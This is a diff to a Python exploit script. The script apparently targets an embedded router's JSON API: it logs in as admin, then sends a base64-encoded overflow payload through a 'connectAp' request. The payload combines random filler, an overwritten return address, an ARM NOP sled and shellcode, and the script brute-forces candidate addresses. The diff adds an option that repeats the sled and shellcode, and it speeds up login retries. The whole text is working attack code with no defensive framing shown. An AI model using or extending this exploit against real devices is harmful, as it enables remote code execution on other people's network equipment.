@@ -38,7 +38,7 @@ SLED = b"\x00\x00\xa0\xe1"   # mov r0,r0 (repeat to length at build time)
 
 
 def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b"", bare=False,
-          sledfill=False):
+          sledfill=False, units=1):
     """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode.
 
     `bare` stops after the overwritten word, so the payload length is exactly the
@@ -56,7 +56,8 @@ def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b"", bare=Fals
         filler = pre + bytes(random.getrandbits(8) for _ in range(max(0, offset - len(pre))))
     val = marker if marker is not None else addr
     pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
-    return base64.b64encode(filler + pc + SLED * (sled // 4) + sc).decode()
+    body = SLED * (sled // 4) + sc
+    return base64.b64encode(filler + pc + body * max(1, units)).decode()
 
 
 def sha(s):
@@ -77,11 +78,11 @@ def login(host, tries=90):
         try:
             j = json.loads(post(host, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3))
         except Exception:
-            time.sleep(2)
+            time.sleep(1)
             continue
         d = (j.get("result") or {}).get("data") or {}
         if not d.get("device_confirm"):
-            time.sleep(2)
+            time.sleep(1)
             continue
         dc, nonce = d["device_confirm"], d["nonce"]
         try:
@@ -143,6 +144,7 @@ def main():
     ap.add_argument("--prefix", default="")
     ap.add_argument("--bare", action="store_true", help="stop at the overwritten word")
     ap.add_argument("--sledfill", action="store_true", help="NOP-fill everything before the pc")
+    ap.add_argument("--units", type=int, default=1, help="repeat sled+shellcode N times")
     ap.add_argument("--count", type=int, default=40)
     ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
     a = ap.parse_args()
@@ -165,7 +167,7 @@ def main():
                 os.makedirs("/tmp/pane1", exist_ok=True)
                 open(idx, "w").write(str(i))
             b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc,
-                        prefix=a.prefix.encode(), sledfill=a.sledfill)
+                        prefix=a.prefix.encode(), sledfill=a.sledfill, units=a.units)
             params = connect_params(b64, a.ssid, a.bssid)
             t0 = time.time()
             r = req(a.host, sess, {"method": "connectAp", "params": params}, timeout=6)
@@ -181,7 +183,8 @@ def main():
                 sess = login(a.host, tries=40)
         return
 
-    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode(), a.bare)
+    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode(), a.bare,
+                units=a.units)
     if a.mode == "build":
         if a.out:
             open(a.out, "w").write(b64)
